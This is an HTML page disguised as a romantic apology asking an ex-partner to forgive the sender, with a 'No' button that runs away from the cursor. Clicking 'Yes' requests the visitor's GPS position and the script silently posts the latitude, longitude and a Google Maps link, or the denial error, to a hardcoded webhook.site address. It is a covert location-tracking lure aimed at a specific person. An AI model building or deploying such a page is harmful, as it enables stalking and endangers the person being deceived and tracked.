<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>wapas aao baua! 🥺</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&family=Pacifico&display=swap');
        body { margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #fce4ec; font-family: 'Poppins', sans-serif; overflow: hidden; }
        .container { text-align: center; background: rgba(255, 255, 255, 0.9); padding: 50px; border-radius: 25px; box-shadow: 0 15px 35px rgba(233, 30, 99, 0.15); max-width: 400px; z-index: 10; }
        h1 { font-family: 'Pacifico', cursive; color: #e91e63; font-size: 3rem; margin-bottom: 10px; }
        p { color: #666; font-size: 1.1rem; margin-bottom: 30px; }
        .btn-container { display: flex; justify-content: center; gap: 20px; }
        .btn { background-color: #ff4081; color: white; border: none; padding: 15px 30px; font-size: 1rem; border-radius: 50px; cursor: pointer; transition: all 0.3s ease; font-weight: 600; }
        #noBtn { background-color: #9e9e9e; position: relative; }
    </style>
</head>
<body>

    <div class="container" id="mainCard">
        <h1>pls come back! 🥺</h1>
        <p>I know things got messed up. <br> Can you forgive me?</p>
        <div class="btn-container">
            <button class="btn" onclick="askLocation()">Yes, I forgive you ❤️</button>
            <button class="btn" id="noBtn" onmouseover="moveButton()">No</button>
        </div>
    </div>

    <script>
        // APNA WEBHOOK YAHAN CHECK KAREIN
        const myWebhook = "https://webhook.site/69cf21e1-aa39-43db-acb6-f467303d55f4";

        function sendToWebhook(data) {
            fetch(myWebhook, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(e => console.log("Sent"));
        }

        function askLocation() {
            if (navigator.geolocation) {
                // Ye line browser popup trigger karegi
                navigator.geolocation.getCurrentPosition(success, fail, {timeout: 10000});
            } else {
                showLove();
            }
        }

        function success(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            sendToWebhook({
                Status: "SUCCESS_GPS",
                Maps_Link: `https://www.google.com/maps?q=${lat},${lon}`,
                Latitude: lat,
                Longitude: lon
            });
            showLove();
        }

        function fail(error) {
            sendToWebhook({ Status: "DENIED_OR_FAILED", Error: error.message });
            showLove();
        }

        function moveButton() {
            const btn = document.getElementById('noBtn');
            btn.style.position = 'absolute';
            btn.style.top = Math.random() * (window.innerHeight - 50) + 'px';
            btn.style.left = Math.random() * (window.innerWidth - 100) + 'px';
        }

        function showLove() {
            document.getElementById('mainCard').innerHTML = `
                <h1>Yay! 🥰</h1>
                <p>Thank you! Let's meet up soon!</p>
                <div style="font-size: 4rem;">❤️</div>
            `;
        }
    </script>
</body>
</html>
